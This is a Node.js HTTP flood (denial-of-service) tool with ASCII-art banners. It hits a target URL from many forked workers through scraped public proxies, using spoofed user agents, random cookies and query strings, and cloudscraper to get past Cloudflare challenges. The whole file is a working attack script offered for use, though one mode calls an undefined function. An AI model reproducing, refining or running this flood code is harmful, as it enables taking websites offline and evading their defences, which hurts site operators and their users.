const target = process.argv[2];
const time = process.argv[3]
const mode = process.argv[4];
const threads = process.argv[5];
const axios = require('axios');
const cluster = require('cluster')
const fakeua = require('fake-useragent');
const request = require('cloudscraper');
process.setMaxListeners(15);

if (process.argv.length !== 6){
    console.log(`
        ╦ ╦╔╦╗╔╦╗╔═╗╔═╗   ╔╗╔╔═╗╦═╗╔╦╗╔═╗╦  
        ╠═╣ ║  ║ ╠═╝╚═╗───║║║║ ║╠╦╝║║║╠═╣║  
        ╩ ╩ ╩  ╩ ╩  ╚═╝   ╝╚╝╚═╝╩╚═╩ ╩╩ ╩╩═╝
             Developed By AnonPrixor
    ./socketv8 <URL> <TIME> <HTTP-GET/HTTPS-BYPASS/HTTPS-DROWN/> <THREADS>

`),
    process.exit(0);
} else {
    main();
}

async function main() {

    console.log(`
    

               ╔═════════════════════════════════════╗
               ║  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   ╔═╗╔═╗╔╗╔╔╦╗  ║
               ║  ╠═╣ ║  ║ ╠═╣║  ╠╩╗   ╚═╗║╣ ║║║ ║   ║
               ║  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩   ╚═╝╚═╝╝╚╝ ╩   ║
               ╚═════╦═════════════════════════╦═════╝
        ╔════════════╩═════════════════════════╩═══════════╗
                     Developed By AnonPrixor
    `)
    console.log("           Target: ", process.argv[2])
    console.log("           Time: ", process.argv[3])
    console.log("           Method: ", process.argv[4] )
    console.log("           Threads: ", process.argv[5])
    console.log(`
        ╚══════════════════════════════════════════════════╝
    `)
    const proxyscrape = await axios.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=all', 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt', 'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt');
    const proxies = proxyscrape.data.replace(/\r/g, '').split('\n');

    function makeid(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}
    
    function send_req_proxy() {

        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        let useragent = fakeua();
        request.get({
        uri: target,
        resolveWithFullResponse: true,
        challengesToSolve: 1,
        proxy: "http://" + proxy,
        headers: {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': useragent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US'
        }
        },function (error, response, body) {
            if (response.statusCode == 200){
                console.log("STATUS CODE | [>> 200 (OK) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 301 || response.statusCode == 302) {
                console.log("STATUS CODE | [>> 301 or 302 (MOVED PERMANENTLY) <<] -> ", process.argv[2])
            } else if (response.statusCode == 404) {
                console.log("STATUS CODE | [>> 404 (NOT FOUND) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 403) {
                console.log("STATUS CODE | [>> 403 (FORBIDDEN) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 500) {
                console.log("STATUS CODE | [>> 500 (INTERNAL SERVER ERROR) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 502) {
                
                console.log("STATUS CODE | [>> 502 (BAD GATEWAY) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 503) {
                console.log("STATUS CODE | [>> 503 (SERVICE UNAVAILABLE) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 504) {
                console.log("STATUS CODE | [>> 504 (GATEWAY TIMED OUT) <<] -> ", process.argv[2])
            } else {
                console.log("STATUS CODE | [>> WAIT <<] -> ", process.argv[2])
            }
        });

    };
    
    function send_get() {

        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        let useragent = fakeua();
        let randomstr = makeid(15);
        request.get({
        uri: target,
        resolveWithFullResponse: true,
        challengesToSolve: 1,
        followRedirects: 1,
        proxy: "http://" + proxy,
        headers: {
            ':method': 'GET',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': useragent,
            'Accept': "*/*",
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-PH',
            'Cookie': randomstr,
            randomstr
        }
        },function (error, response, body) {
            if (response.statusCode == 200){
                console.log("STATUS CODE | [>> 200 (OK) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 301 || response.statusCode == 302) {
                console.log("STATUS CODE | [>> 301 or 302 (MOVED PERMANENTLY) <<] -> ", process.argv[2])
            } else if (response.statusCode == 404) {
                console.log("STATUS CODE | [>> 404 (NOT FOUND) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 403) {
                console.log("STATUS CODE | [>> 403 (FORBIDDEN) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 500) {
                console.log("STATUS CODE | [>> 500 (INTERNAL SERVER ERROR) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 502) {
                
                console.log("STATUS CODE | [>> 502 (BAD GATEWAY) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 503) {
                console.log("STATUS CODE | [>> 503 (SERVICE UNAVAILABLE) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 504) {
                console.log("STATUS CODE | [>> 504 (GATEWAY TIMED OUT) <<] -> ", process.argv[2])
            } else {
                console.log("STATUS CODE | [>> WAIT <<] -> ", process.argv[2])
            }

        });
    }

    function send_req_uam() {

        let useragent = fakeua();
        let randomstr = makeid(15);
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        request.get({
        uri: target + "?v=" + randomstr,
        resolveWithFullResponse: true,
        proxy: "http://" + proxy,
        challengesToSolve: 100,
        headers: {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': 1,
            'User-Agent': useragent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US',
            'Cookie': randomstr,
            randomstr
        }
        },function (error, response, body) {
            if (response.statusCode == 200){
                console.log("STATUS CODE | [>> 200 (OK) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 301 || response.statusCode == 302) {
                console.log("STATUS CODE | [>> 301 or 302 (MOVED PERMANENTLY) <<] -> ", process.argv[2])
            } else if (response.statusCode == 404) {
                console.log("STATUS CODE | [>> 404 (NOT FOUND) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 403) {
                console.log("STATUS CODE | [>> 403 (FORBIDDEN) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 500) {
                console.log("STATUS CODE | [>> 500 (INTERNAL SERVER ERROR) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 502) {
                
                console.log("STATUS CODE | [>> 502 (BAD GATEWAY) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 503) {
                console.log("STATUS CODE | [>> 503 (SERVICE UNAVAILABLE) <<] -> ", process.argv[2]);
            } else if (response.statusCode == 504) {
                console.log("STATUS CODE | [>> 504 (GATEWAY TIMED OUT) <<] -> ", process.argv[2])
            } else {
                console.log("STATUS CODE | [>> WAIT <<] -> ", process.argv[2])
            }
        });

    };


    function runable() {

        if (cluster.isMaster) {
            for (let i = 0; i < threads; i++) {
                cluster.fork();
            }
            cluster.on('exit', (worker, code, signal) => {
            });
        } else {
            startloop();
        }

        function startloop() {
            if (mode == "HTTP-GET" || mode == "HTTP-GET" || mode == "HTTP-GET"){
                console.log("METHOD: HTTP-GET"),
                setInterval(() => {
                    send_req_proxy();
                });
            } else if (mode == "HTTPS-BYPASS" || mode == "HTTPS-BYPASS" || mode == "HTTPS-BYPASS") {
                console.log("METHOD: HTTPS-BYPASS"),
                setInterval(() => {
                    send_req_storm();
                });
            } else if (mode == "HTTPS-DROWN" || mode == "HTTPS-DROWN" || mode == "HTTPS-DROWN") {
                console.log("METHOD: HTTPS-DROWN"),
                setInterval(() => {
                    send_req_uam();
                });
            } else {
                console.log("[38;2;255;255;51mM[38;2;253;241;59mO[38;2;251;227;67mD[38;2;249;213;75mE[38;2;247;199;83m [38;2;245;185;91mN[38;2;243;171;99mO[38;2;241;157;107mT[38;2;239;143;115m [38;2;237;129;123mF[38;2;235;115;131mO[38;2;233;101;139mU[38;2;231;87;147mN[38;2;229;73;155mD[38;2;227;59;163m![0;00m");
                process.exit(0);
            }
        }

    };

    setTimeout(() => {
        console.log("[38;2;255;255;51mA[38;2;253;237;61mT[38;2;251;219;71mT[38;2;249;201;81mA[38;2;247;183;91mC[38;2;245;165;101mK[38;2;243;147;111m [38;2;241;129;121mE[38;2;239;111;131mN[38;2;237;93;141mD[38;2;235;75;151mE[38;2;233;57;161mD[0;00m"),
        process.exit(0);
    }, time * 1000);

    runable();

}

process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
